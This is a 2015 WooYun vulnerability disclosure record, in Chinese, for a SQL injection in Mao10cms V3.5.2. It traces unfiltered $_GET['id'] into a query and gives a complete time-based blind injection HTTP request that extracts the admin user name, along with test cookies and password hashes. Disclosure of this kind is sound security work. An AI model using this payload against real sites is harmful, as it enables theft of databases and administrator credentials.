{"id": 70202, "wybug_id": "wooyun-2015-0125025", "wybug_title": "Mao10cms最新版前台注入(有条件限制)", "wybug_corp": "mao10.com", "wybug_author": "路人甲", "wybug_date": "2015-07-07 11:47", "wybug_open_date": "2015-10-08 20:34", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "源码分析", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-07-07：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-07-10：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-07-13：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-09-03：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-13：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-23：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-10-08：\t细节向公众公开  简要描述： Mao10cms最新版前台注入 详细说明：  Mao10cms用户量不小，2015-06-25更新的V3.5.2，今天来学习一下吧这个注入问题出现在模板文件中，有多个地方引用这个模板，这里说3个漏洞，是这个问题文件中存在多个注入点引用这个出问题的文件。问题文件在/theme/default/article/single.php,看代码\n<?php mc_template_part('header'); ?><?php foreach($page as $val) : ?>\t<div id=\"single-head-img\" class=\"pr hidden-xs\">\t\t<div class=\"single-head-img shi1\" style=\"background-image: url(<?php if(mc_fmimg($_GET['id'])) : echo mc_fmimg($_GET['id']); else : echo mc_theme_url().'/img/user_bg.jpg'; endif; ?>);\"></div>\t\t<div class=\"single-head-img shi2\"></div>\t\t<div class=\"single-head-img shi3\">\t\t\t<h1><?php echo mc_user_display_name($_GET['id']); ?></h1>\t\t\t<h4><?php echo mc_cut_str(strip_tags(mc_magic_out(mc_get_page_field($_GET['id'],'content'))), 80); ?></h4>\t\t</div>\t</div>\t<div class=\"container\">\t\t<div class=\"row\">\t\t\t<div class=\"col-sm-12 col-md-10 col-md-offset-1 col-lg-8 col-lg-offset-2\">\t\t\t\t<ul class=\"list-inline mb-0 article-brd\">\t\t\t\t\t<li>\t\t\t\t\t\t<a href=\"<?php echo U('article/index/term?id='.mc_get_meta($val['id'],'term')); ?>\">\t\t\t\t\t\t\t<i class=\"glyphicon glyphicon-th-list\"></i> <?php echo mc_get_page_field(mc_get_meta($val['id'],'term'),'title'); ?>\t\t\t\t\t\t</a>\t\t\t\t\t</li>\t\t\t\t\t<li class=\"pull-right hidden-xs\">\t\t\t\t\t\t<i class=\"glyphicon glyphicon-time\"></i> <?php echo date('m/d H:i',$val['date']); ?>\t\t\t\t\t</li>\t\t\t\t\t<li class=\"pull-right hidden-xs\">\t\t\t\t\t\t<i class=\"glyphicon glyphicon-eye-open\"></i> <?php echo mc_views_count($val['id']); ?>\t\t\t\t\t</li>\t\t\t\t</ul>无关代码\n看到文件中多次引用了mc_fmimg($_GET['id'])，去看看\n//调用page封面图片function mc_fmimg($id) {\tif(mc_get_meta($id,'fmimg')) {\t\treturn mc_get_meta($id,'fmimg');\t} elseif(mc_catch_that_image($id)) {\t\treturn mc_catch_that_image($id);\t} else {\t\treturn mc_option('fmimg');\t}};\n$_GET['id']进入了mc_get_meta，再去看看\n//调用metafunction mc_get_meta($page_id,$meta_key,$array=true,$type='basic') {\t$meta = M('meta')->where(\"page_id='$page_id' AND meta_key='$meta_key' AND type ='$type'\")->order('id desc');\tif($array) {\t\treturn $meta->getField('meta_value');\t} else {\t\treturn $meta->getField('meta_value',true);\t};}\n没有经过处理，可以SQL注入出任意数据这里就找个调用该文件的url进行测试，修复时请自行查找调用该文件的地方下面以time-based blind注入进行证明Payload(POST提交):\nPOST /index.php?m=article&c=index&a=single&id=123')union/**/select/**/if(mid((select/**/admin_name/**/from/**/pe_admin/**/limit/**/0,1),1,1)='zs',sleep(1),0)%23 HTTP/1.1Host: localhostUser-Agent: Mozilla/5.0 (Windows NT 6.1; rv:38.0) Gecko/20100101 Firefox/38.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh,zh-CN;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://localhost/index.php?m=article&c=index&a=single&id=5Cookie: 2ev28n3dapp_admininfo=864cM2QjN%2BbkWmbIFVhnPZd5%2BrpdMp4xWzFseC%2Fbe4EBpDKafUGLY7WrakVbYuL46Bbsct6okOjqwOYiELEqJ6C9LBHCiz3RB7VTZ7XN6mwhnpI; bdshare_firstime=1430664757834; CNZZDATA1253530733=1001420044-1432556580-%7C1432556580; PHPSESSID=48jqli3eaqpfkl6i57p51pprn6; user_name=pigtest; user_pass=d0b942fd21ac7b9253a6175179ea7df9Connection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 4id=5\n当猜测错误时，如下图\n\n当猜测正确时，如下图\n\n整个注入过程可以使用burpsuite 或者sqlmap 再或者自己写个脚本来跑，在本地进行测试，用户名为admin，密码为f6fdffe48c908deb0f4c3bd36c032e72   漏洞证明：  见 详细说明   修复方案：  过滤   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-07-10 20:32 厂商回复： 感谢指出 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}